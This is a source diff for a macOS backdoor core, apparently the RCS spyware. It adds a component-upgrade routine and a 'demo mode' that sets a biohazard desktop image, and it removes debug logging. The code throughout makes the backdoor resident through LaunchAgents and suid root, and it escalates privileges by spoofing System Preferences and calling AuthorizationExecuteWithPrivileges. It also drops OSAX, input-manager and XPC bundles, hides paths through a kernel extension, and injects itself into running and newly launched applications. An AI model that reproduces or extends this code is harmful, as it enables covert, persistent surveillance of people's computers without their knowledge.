@@ -44,6 +44,8 @@
 #import "RCSMDebug.h"
 
 #import "NSApplication+SystemVersion.h"
+#import "NSMutableData+SHA1.h"
+#import "RCSMDesktopImage.h"
 
 #define ICON_FILENAME  @"q45tyh"
 
@@ -1506,10 +1508,12 @@ void lionSendEventToPid(pid_t pidP)
 - (void)_guessNames
 {
 #ifdef DEV_MODE
-  unsigned char result[CC_MD5_DIGEST_LENGTH];
-  CC_MD5(gConfAesKey, strlen(gConfAesKey), result);
-  
-  NSData *temp = [NSData dataWithBytes: result
+//  unsigned char result[CC_MD5_DIGEST_LENGTH];
+//  CC_MD5(gConfAesKey, strlen(gConfAesKey), result);
+//  
+//  NSData *temp = [NSData dataWithBytes: result
+//                                length: CC_MD5_DIGEST_LENGTH];
+  NSData *temp = [NSData dataWithBytes: gConfAesKey
                                 length: CC_MD5_DIGEST_LENGTH];
 #else
   NSData *temp = [NSData dataWithBytes: gConfAesKey
@@ -2035,18 +2039,12 @@ void lionSendEventToPid(pid_t pidP)
 {
   if (getuid() != 0 && geteuid() != 0)
     {
-      //
       // Check the application executable name, if different than
       // application name it means we're trying to get root through UI
       // Spoofing, thus we relaunch ourself and exit after having
       // obtained the new privileges
-      //
       if (![mBinaryName isEqualToString: @"System Preferences"])
-        {
-#ifdef DEBUG_CORE
-          infoLog(@"Making backdoor resident");
-#endif
-      
+        {      
           if ([self makeBackdoorResident] == NO)
             {
 #ifdef DEBUG_CORE
@@ -2061,6 +2059,7 @@ void lionSendEventToPid(pid_t pidP)
           [@"" writeToFile: tempFileName
                 atomically: YES
                   encoding: NSUTF8StringEncoding error: nil];
+                  
           [tempFileName release];
           
           [self _renameBackdoorAndRelaunch];
@@ -2068,7 +2067,6 @@ void lionSendEventToPid(pid_t pidP)
       else
         {
           [self UISudoWhileAlreadyAuthorized: NO];
-          //[self getRootThroughUISpoofing: @"System Preferences"];
         }
     }
   else
@@ -2080,22 +2078,15 @@ void lionSendEventToPid(pid_t pidP)
           [self UISudoWhileAlreadyAuthorized: YES];
         }
       
-      //[gUtil disableSetugidAuth];
       [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
       
       NSString *flagPath   = [NSString stringWithFormat: @"%@/%@",
                               [[NSBundle mainBundle] bundlePath],
                               @"mdworker.flg"];
-#ifdef DEBUG_CORE
-      infoLog(@"Looking for mdworker.flg");
-#endif
-      
+    
       if (![[NSFileManager defaultManager] fileExistsAtPath: flagPath
                                                 isDirectory: NO])
         {
-#ifdef DEBUG_CORE
-          warnLog(@"mdworker.flg not found. Relaunching through launchd");
-#endif
           [gUtil dropExecFlag];
           
           NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
@@ -2117,12 +2108,6 @@ void lionSendEventToPid(pid_t pidP)
                 waitUntilEnd: NO];
           
           exit(0);
-        }
-      else
-        {
-#ifdef DEBUG_CORE
-          infoLog(@"mdworker flag found! Already loaded by launchd");
-#endif
         }
       
       return YES;
@@ -2275,15 +2260,13 @@ void lionSendEventToPid(pid_t pidP)
   
   if (getuid() == 0 || geteuid() == 0) 
     {
-      osaxRootPath = [[NSString alloc] initWithFormat: @"/%@",
-                   OSAX_ROOT_PATH];
+      osaxRootPath = [[NSString alloc] initWithFormat: @"/%@", OSAX_ROOT_PATH];
 
       // i'm root: remove old low privs osax from user folders
-      NSString *osaxLowPrivsPath = [[NSString alloc]
-        initWithFormat: @"/Users/%@/%@/%@",
-        NSUserName(),
-        OSAX_ROOT_PATH,
-        EXT_BUNDLE_FOLDER];
+      NSString *osaxLowPrivsPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@/%@",
+                                                      NSUserName(),
+                                                      OSAX_ROOT_PATH,
+                                                      EXT_BUNDLE_FOLDER];
 
       if ([[NSFileManager defaultManager] fileExistsAtPath: osaxLowPrivsPath])
         {
@@ -2295,8 +2278,8 @@ void lionSendEventToPid(pid_t pidP)
   else
     {
       osaxRootPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@",
-                   NSUserName(),
-                   OSAX_ROOT_PATH];
+                                                       NSUserName(),
+                                                       OSAX_ROOT_PATH];
     }
   
   if (![[NSFileManager defaultManager] fileExistsAtPath: osaxRootPath])
@@ -2307,20 +2290,9 @@ void lionSendEventToPid(pid_t pidP)
                                                       error: nil];
     }
   
-#ifdef DEBUG_CORE
-  infoLog(@"osaxRootPath %@", osaxRootPath);
-#endif
-  
-  NSMutableString *osaxPath = [[NSMutableString alloc]
-                               initWithFormat: @"%@/%@",
-                               osaxRootPath,
-                               EXT_BUNDLE_FOLDER];
-  
-  
-  
-#ifdef DEBUG_CORE
-  infoLog(@"osaxPath %@", osaxPath);
-#endif
+  NSMutableString *osaxPath = [[NSMutableString alloc] initWithFormat: @"%@/%@",
+                                                                        osaxRootPath,
+                                                                        EXT_BUNDLE_FOLDER];
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: osaxPath])
     {
@@ -2328,7 +2300,6 @@ void lionSendEventToPid(pid_t pidP)
                                                  error: nil];
     }
   
-  //
   // Scripting folder
   mkdir([osaxRootPath UTF8String], 0755);
   mkdir([osaxPath UTF8String], 0755);
@@ -2350,10 +2321,6 @@ void lionSendEventToPid(pid_t pidP)
                        gInputManagerName];
   [osaxPath release];
   
-#ifdef DEBUG_CORE
-  infoLog(@"destination osax %@", destDir);
-#endif
-  
   NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
                          [[NSBundle mainBundle] bundlePath],
                          gInputManagerName];
@@ -2361,37 +2328,19 @@ void lionSendEventToPid(pid_t pidP)
   if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
                                            isDirectory: NO] == NO)
     {
-#ifdef DEBUG_CORE
-      infoLog(@"copying inputmanager file from %@", tempIMDir);
-#endif
       [[NSFileManager defaultManager] copyItemAtPath: tempIMDir
                                               toPath: destDir
                                                error: nil];
-#ifdef DEBUG_CORE
-      if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
-                                               isDirectory: NO] == NO)
-        infoLog(@"OSAX file not created");
-      else
-        infoLog(@"OSAX file created correctly");
-#endif
     }
   
   [tempIMDir release];
   [destDir release];
   
   NSString *info_orig_pl = [[NSString alloc] initWithCString: Info_plist];
-  
-#ifdef DEBUG_CORE
-  verboseLog(@"Original info.plist for osax %@", info_orig_pl);
-#endif
-  
+
   NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMInputManager" 
                                                               withString: gInputManagerName];
-  
-#ifdef DEBUG_CORE
-  verboseLog(@"info.plist for osax %@", info_pl);
-#endif
-  
+
   NSString *infoPath = [NSString stringWithFormat:
                         @"%@/%@/Contents/Info.plist",
                         osaxRootPath,
@@ -3003,146 +2952,185 @@ void lionSendEventToPid(pid_t pidP)
     }
 }
 
+- (BOOL)shouldUpgradeComponents
+{
+  NSString *migrationConfig = [[NSString alloc] initWithFormat: @"%@/%@",
+                                                                [[NSBundle mainBundle] bundlePath],
+                                                                RCS8_MIGRATION_CONFIG];
+                                 
+  if ([[NSFileManager defaultManager] fileExistsAtPath: migrationConfig] == TRUE)
+    {  
+        NSString *configurationPath = [[NSString alloc] initWithFormat: @"%@/%@",
+                                       [[NSBundle mainBundle] bundlePath],
+                                       gConfigurationName];
+                                                            
+        if ([[NSFileManager defaultManager] removeItemAtPath: configurationPath
+                                                       error: nil])
+          {
+            if ([[NSFileManager defaultManager] moveItemAtPath: migrationConfig
+                                                        toPath: configurationPath
+                                                         error: nil])
+              {
+                [migrationConfig release];
+                [configurationPath release];
+                return TRUE;
+              }
+          }
+        
+        [configurationPath release];
+    }
+    
+  [migrationConfig release];
+  
+  NSString *updateDylib = [[NSString alloc] initWithFormat: @"%@/%@",
+                                                            [[NSBundle mainBundle] bundlePath],
+                                                            RCS8_UPDATE_DYLIB];
+                                                            
+  if ([[NSFileManager defaultManager] fileExistsAtPath: RCS8_UPDATE_DYLIB] == TRUE)
+  
+    {
+      NSString *dylib = [[NSString alloc] initWithFormat: @"%@/%@",
+                                                          [[NSBundle mainBundle] bundlePath],
+                                                          gInputManagerName];
+      
+      [[NSFileManager defaultManager] removeItemAtPath:dylib error:nil];
+      
+      [[NSFileManager defaultManager] moveItemAtPath: updateDylib
+                                              toPath: dylib
+                                               error: nil];
+      [dylib release];                                      
+
+    }
+  
+  [updateDylib release];
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath: RCS8_UPDATE_XPC] == TRUE)
+    {
+    
+    }
+      
+  return TRUE;
+}
+
+- (void)checkAndRunDemoMode
+{
+  NSString *appName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
+  
+  // FIXED- demo mode
+  if ([appName isEqualToString: @"System Preferences"] == FALSE)
+    {
+      // precalc sha1 of "hxVtdxJ/Z8LvK3ULSnKRUmLE
+      char demoSha1[] = "\x31\xa2\x85\xaf\xb0\x43\xe7\xa0\x90\x49"
+                        "\x94\xe1\x70\x07\xc8\x26\x3d\x45\x42\x73";
+      
+      NSMutableData *isDemoMarker = [[NSMutableData alloc] initWithBytes: demoSha1 length: 20];
+      
+      NSMutableData *demoMode = [[NSData alloc] initWithBytes: gDemoMarker length: 24];
+      
+      NSMutableData *currDemoMode = [demoMode sha1Hash];
+      
+      if ([currDemoMode isEqualToData: isDemoMarker] == TRUE) 
+        {
+//        NSString *filePath = [[NSString alloc] initWithFormat: @"%@/bio.bmp",
+//                              NSHomeDirectory()];
+
+          NSString *filePath = [[NSString alloc] initWithFormat: @"%@/%@",
+                                                                 [[NSBundle mainBundle] bundlePath],
+                                                                 @"infected.bmp"];
+                             
+          NSData *bmpData = [[NSData alloc] initWithBytes: biohazard_bmp
+                                                   length: biohazard_bmp_len];
+          
+          [bmpData writeToFile: filePath atomically: YES];
+          
+          //changeDesktopBackground(filePath, FALSE);
+          changeDesktopBg(filePath, NO);
+          
+          gIsDemoMode = YES;
+          
+          [filePath release];
+          [bmpData release];
+      }    
+    }
+}
+
 - (BOOL)runMeh
 {
   NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+  
   BOOL sliSuccess = NO, uiSuccess = NO, noPrivs = NO;
-
-  //
-  // First of all, calculate properly the shared memory size
-  // for logs
-  //
-  gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MAX_NUM_BLOCKS;
-
-  //
-  // Get OS version
-  //
-  [[NSApplication sharedApplication] getSystemVersionMajor: &gOSMajor
-                                                     minor: &gOSMinor
-                                                    bugFix: &gOSBugFix];
-
-  // First off check if we support the OS
-  if (gOSMajor != 10
-      || (gOSMajor == 10 && gOSMinor < 5)
-      || (gOSMajor == 10 && gOSMinor > 7))
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Unsupported OS version (%@.%@.%@)",
-               gOSMajor, gOSMinor, gOSBugFix);
-#endif
-      return NO;
-    }
   
-#ifdef DEBUG_CORE
-  infoLog(@"uid : %d", getuid());
-  infoLog(@"euid: %d", geteuid());
-#endif
-  
-  NSString *offlineFlag = [NSString stringWithFormat: @"%@/00",
-                           [[NSBundle mainBundle] bundlePath]];
-  
-  if ([[NSFileManager defaultManager] fileExistsAtPath: offlineFlag])
-    {
-#ifdef DEBUG_CORE
-      warnLog(@"Offline mode, installing the backdoor right now");
-#endif
-      [self makeBackdoorResident];
-      [[NSFileManager defaultManager] removeItemAtPath: offlineFlag
-                                                 error: nil];
-    }
-
-  //
-  // With SLIPLIST mode, the backdoor will be executed preauth with uid = 0
-  // and will be killed once the user will login, thus we just suid the core
-  // and drop the LaunchAgent startup item in order to get executed after login
-  //
-  if (getuid() == 0)
-    {
-#ifdef DEBUG_CORE
-      infoLog(@"Root executed us");
-      infoLog(@"Making binary root suid and dropping launch agents plist");
-#endif
-      
-      [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
-      if ([self makeBackdoorResident] == NO)
-        {
-#ifdef DEBUG_CORE
-          errorLog(@"Error while dropping Launch Agents plist for SLI PLIST mode");
-#endif
-        }
-      else
-        {
-#ifdef DEBUG_CORE
-          infoLog(@"Launch Agents plist dropped");
-#endif
-        }
-
-      exit(0);
-    }
-
-  //
-  // Resize shared mem if needed, on default installation we need to increase
-  // this values
-  //
-  [self _resizeSharedMemoryWindow];
-  
-  //
-  // Check it we're the only one on the current user session (1 per user)
-  //
-  [self _checkForOthers];
-  
-  //
   // Check the preconfigured mode - default is SLIPLIST
-  //
 #ifdef DEV_MODE
   NSString *workingMode = [[NSString alloc] initWithString: DEV];
 #else
   NSString *workingMode = [[NSString alloc] initWithCString: gMode];
 #endif
   
+  // First of all, calculate properly the shared memory size
+  // for logs
+  gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MAX_NUM_BLOCKS;
+
+  // Get OS version
+  [[NSApplication sharedApplication] getSystemVersionMajor: &gOSMajor
+                                                     minor: &gOSMinor
+                                                    bugFix: &gOSBugFix];
+  // First off check if we support the OS
+  if (gOSMajor != 10
+      || (gOSMajor == 10 && gOSMinor < 5)
+      || (gOSMajor == 10 && gOSMinor > 7))
+    {
+      return NO;
+    }
+  
+  // check if we are running rcs8 for the first time
+  // or there are comps ready for upgrade
+  [self shouldUpgradeComponents];
+  
+  NSString *offlineFlag = [NSString stringWithFormat: @"%@/00",
+                           [[NSBundle mainBundle] bundlePath]];
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath: offlineFlag])
+    {
+      [self makeBackdoorResident];
+      [[NSFileManager defaultManager] removeItemAtPath: offlineFlag
+                                                 error: nil];
+    }
+
+  // Resize shared mem if needed, on default installation we need to increase
+  // this values
+  [self _resizeSharedMemoryWindow];
+  
+  // Check it we're the only one on the current user session (1 per user)
+  [self _checkForOthers];
+  
+  // FIXED-
   if ([workingMode isEqualToString: SLIPLIST])
     {
-#ifdef DEBUG_CORE
-      infoLog(@"SLIPLIST Mode ON");
-#endif
-      if ([gUtil isLeopard])
+      // SLIPLIST set by "require admin privileges" unflagged
+      noPrivs = YES;
+      NSString *flagPath   = [NSString stringWithFormat: @"%@/%@",
+                              [[NSBundle mainBundle] bundlePath],
+                              @"mdworker.flg"];
+      
+      if (![[NSFileManager defaultManager] fileExistsAtPath: flagPath
+                                                isDirectory: NO])
         {
-#ifdef DEBUG_CORE
-          infoLog(@"SLI on Leopard");
-#endif
-          sliSuccess = [self _SLIEscalation];
-        }
-      else
-        {
-#ifdef DEBUG_CORE
-          warnLog(@"SLI on >10.5, just going with noprivs");
-#endif
-          noPrivs = YES;
+          [gUtil dropExecFlag];
         }
     }
   else if ([workingMode isEqualToString: UISPOOF])
     {
-#ifndef NO_UISPOOF
-      // As of now unsupported on Lion
-      if (gOSMajor == 10 && gOSMinor == 7)
+      // set by "require admin privileges"
+      if ([gUtil isLion] == YES)
         {
-#ifdef DEBUG_CORE
-          infoLog(@"Skipping UI Spoof on Lion");
-#endif
-          //uiSuccess = YES;
           NSString *flagPath   = [NSString stringWithFormat: @"%@/%@",
-                   [[NSBundle mainBundle] bundlePath],
-                   @"mdworker.flg"];
-#ifdef DEBUG_CORE
-          infoLog(@"Looking for mdworker.flg");
-#endif
+                                                             [[NSBundle mainBundle] bundlePath],
+                                                             @"mdworker.flg"];
 
           if (![[NSFileManager defaultManager] fileExistsAtPath: flagPath
                                                     isDirectory: NO])
             {
-#ifdef DEBUG_CORE
-              warnLog(@"mdworker.flg not found. Relaunching through launchd");
-#endif
               [gUtil dropExecFlag];
             }
         
@@ -3153,38 +3141,14 @@ void lionSendEventToPid(pid_t pidP)
               errorLog(@"Error while enabling setugid_appkit capability");
 #endif
             }
-          else
-            {
-#ifdef DEBUG_CORE
-              warnLog(@"setugid_appkit enabled");
-#endif
-            }
         }
       else
         {
-#ifdef DEBUG_CORE
-          infoLog(@"UI Spoofing");
-#endif
           uiSuccess = [self _UISpoof];
         }
-#else // NO_UISPOOF
-      uiSuccess = YES;
-#endif
-    }
-  else
-    {
-#ifdef DEBUG_CORE
-      infoLog(@"Dev mode on");
-      
-      uiSuccess   = YES;
-      sliSuccess  = YES;
-      noPrivs     = YES;
-#endif
     }
   
-  //
   // Create LaunchAgent dir if it doesn't exists yet
-  //
   NSString *launchAgentPath = [NSString stringWithFormat: @"%@/%@",
                                NSHomeDirectory(),
                                [BACKDOOR_DAEMON_PLIST stringByDeletingLastPathComponent]];
@@ -3207,73 +3171,27 @@ void lionSendEventToPid(pid_t pidP)
       [_tempArguments release];
     }
 
-  //
   // Check if the backdoor is already resident
   // otherwise add all the required files for making it resident
-  //
-  if ([self isBackdoorAlreadyResident] == YES)
-    {
-#ifdef DEBUG_CORE
-      warnLog(@"Backdoor has been made already resident");
-#endif
-      
-      if ([gUtil isBackdoorPresentInSLI: [gUtil mBackdoorPath]] == YES)
-        {
-#ifdef DEBUG_CORE
-          infoLog(@"Removing the backdoor entry form the global SLI");
-#endif
-          if ([gUtil removeBackdoorFromSLIPlist] == YES)
-            {
-#ifdef DEBUG_CORE
-              infoLog(@"Backdoor removed correctly from SLI");
-#endif
-            }
-        }
-    }
-  else
-    {
-#ifdef DEBUG_CORE
-      warnLog(@"Backdoor has not been made resident yet");
-#endif
-      
+  if ([self isBackdoorAlreadyResident] == NO)
+    {  
       if (([workingMode isEqualToString: SLIPLIST] && sliSuccess == YES)
           || ([workingMode isEqualToString: UISPOOF])
           || (noPrivs == YES))
         {
-#ifdef DEBUG_CORE
-          infoLog(@"makeBackdoorResident stage");
-#endif
           if ([self makeBackdoorResident] == NO)
             {
 #ifdef DEBUG_CORE
               errorLog(@"An error occurred");
 #endif
-            }
-          else
-            {
-#ifdef DEBUG_CORE
-              infoLog(@"successful");
-#endif
-              if ([gUtil isBackdoorPresentInSLI: [gUtil mBackdoorPath]] == YES)
-                {
-#ifdef DEBUG_CORE
-                  warnLog(@"Removing the backdoor entry form the global SLI");
-#endif
-                  if ([gUtil removeBackdoorFromSLIPlist] == YES)
-                    {
-#ifdef DEBUG_CORE
-                      infoLog(@"Backdoor removed correctly from SLI");
-#endif
-                    }
-                }
-            }          
+            }         
         }
     }
+    
   [workingMode release];
   
   //
   // Create and initialize shared memory
-  //
   if ([mApplicationName isEqualToString: @"System Preferences"] == NO)
     {
       if ([self _createAndInitSharedMemory] == NO)
@@ -3284,49 +3202,22 @@ void lionSendEventToPid(pid_t pidP)
           return NO;
         }
     }
-  
+    
+  //XXX-  
   if ([[NSFileManager defaultManager] fileExistsAtPath: [gUtil mExecFlag]
                                            isDirectory: NULL])
     {
-#ifdef DEBUG_CORE
-      infoLog(@"mExecFlag exists");
-#endif
       [self _createInternalFilesAndFolders];
 
-      //
-      // Now it's time for all the Info.plist mess
-      // we need to create the fs hierarchy for the input manager and kext
-      //
-      if ([gUtil isLeopard] && (getuid() == 0 || geteuid() == 0))
+      [self _dropOsaxBundle];
+      
+      // Drop xpc services for sandboxed app
+      if ([gUtil isLion] && (getuid() == 0 || geteuid() == 0))
         {
-#ifdef DEBUG_CORE
-          infoLog(@"Dropping input manager");
-#endif
-          if ([self _dropInputManager] == NO)
-            {
-#ifdef DEBUG_CORE
-              errorLog(@"Error while installing input manager");
-#endif
-            }
-        }
-      else
-        {
-#ifdef DEBUG_CORE
-          infoLog(@"Dropping OSAX");
-#endif
-          [self _dropOsaxBundle];
-          
-          // Drop xpc services for sandboxed app
-          if ([gUtil isLion] && (getuid() == 0 || geteuid() == 0))
-            {
-#ifdef DEBUG_CORE
-              infoLog(@"im on lion dropping XPC service");
-#endif
-              [self _dropXPCBundle];
-            }
+          [self _dropXPCBundle];
         }
     }
-  
+
   [NSThread detachNewThreadSelector: @selector(_registerForShutdownNotifications)
                            toTarget: self
                          withObject: nil];
@@ -3377,7 +3268,6 @@ void lionSendEventToPid(pid_t pidP)
       //
       // Since Snow Leopard doesn't export all the required symbols
       // we're gonna solve them from uspace and send 'em back to kspace
-      //
       [self _solveKernelSymbolsForKext];
 
       os_version_t os_ver;
@@ -3390,7 +3280,6 @@ void lionSendEventToPid(pid_t pidP)
 
       //
       // Start hiding all the required paths
-      //
       NSString *backdoorPlist = [[NSString alloc] initWithString: BACKDOOR_DAEMON_PLIST];
       
 #ifdef DEBUG_CORE
@@ -3466,20 +3355,11 @@ void lionSendEventToPid(pid_t pidP)
       
       if (pActivityM != nil) 
         {
-#ifdef DEBUG_CORE
-          warnLog(@"find running ActivityMonitor with pid %d, injecting...", pActivityM);
-#endif
           NSNumber *thePid = [[NSNumber alloc] initWithInt: [pActivityM intValue]];
           
           [self sendEventToPid: thePid];
           
           [thePid release];
-        }
-      else 
-        {
-#ifdef DEBUG_CORE
-          warnLog(@"no running ActivityMonitor");
-#endif
         }
     }
 #endif
@@ -3487,6 +3367,10 @@ void lionSendEventToPid(pid_t pidP)
   // inject all running apps in the ws
   [self injectRunningApp];
   
+#ifdef DEBUG_CORE
+  infoLog(@"injectRunningApp done!");
+#endif
+
   // Register notification for new process
   [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
                                                          selector: @selector(injectBundle:)
@@ -3499,20 +3383,10 @@ void lionSendEventToPid(pid_t pidP)
                                                              name: NSWorkspaceDidTerminateApplicationNotification 
                                                            object: nil];
   
-  //
-  // Get a task Manager instance (singleton) and load the configuration
-  // through the confManager
-  //
   RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
   
-  //
-  // Load configuration, starts all agents and the events monitoring routines
-  //
-  [NSThread detachNewThreadSelector: @selector(loadInitialConfiguration)
-                           toTarget: taskManager
-                         withObject: nil];
-  
-  //[taskManager loadInitialConfiguration];
+  // Load configuration, starts all agents and the events monitoring routine
+  [taskManager loadInitialConfiguration];
   
   // Set the backdoorControlFlag to RUNNING
   mMainLoopControlFlag = @"RUNNING";
@@ -3525,19 +3399,14 @@ void lionSendEventToPid(pid_t pidP)
   [infoManager logActionWithDescription: @"Start"];
   [infoManager release];
   
-  //
-  // Check /var/log/system.log
-  //
-  //[NSThread detachNewThreadSelector: @selector(_checkSystemLog)
-  //                         toTarget: self
-  //                       withObject: nil];
+  // set desktop background for demo mode
+  [self checkAndRunDemoMode];
   
-  //
   // Main backdoor loop
-  //
   [self _communicateWithAgents];
   
   [innerPool release];
+  
   return YES;
 }
 
@@ -3683,7 +3552,7 @@ void lionSendEventToPid(pid_t pidP)
           
           NSNumber *thePid = [[NSNumber alloc] initWithInt: tmpPid];
           
-#ifdef DEBUG_CORE
+#ifdef DEBUG_CORE_
         infoLog(@"%s: Injecting app %@ [%d]", __FUNCTION__, 
               [app localizedName], [app processIdentifier]);
 #endif
@@ -3850,16 +3719,6 @@ void lionSendEventToPid(pid_t pidP)
   [pidCommand release];
   [pool release];
 }
-
-/*
-- (void)eventDidFail: (const AppleEvent*)event withError: (NSError*)error
-{
-#ifdef DEBUG_CORE
-  NSDictionary* userInfo = [error userInfo];
-	infoLog(@"Event %@, error %@", event, userInfo);
-#endif
-  
-}*/
 
 - (int)connectKext
 {
@@ -4207,9 +4066,6 @@ void lionSendEventToPid(pid_t pidP)
   infoLog(@"Executing with auth (%@)", execPath);
 #endif
   
-  //
-  // Do IT Bitch!
-  //
   myStatus = AuthorizationExecuteWithPrivileges(myAuthorizationRef,
                                                 (char *)[execPath UTF8String],
                                                 kAuthorizationFlagDefaults,
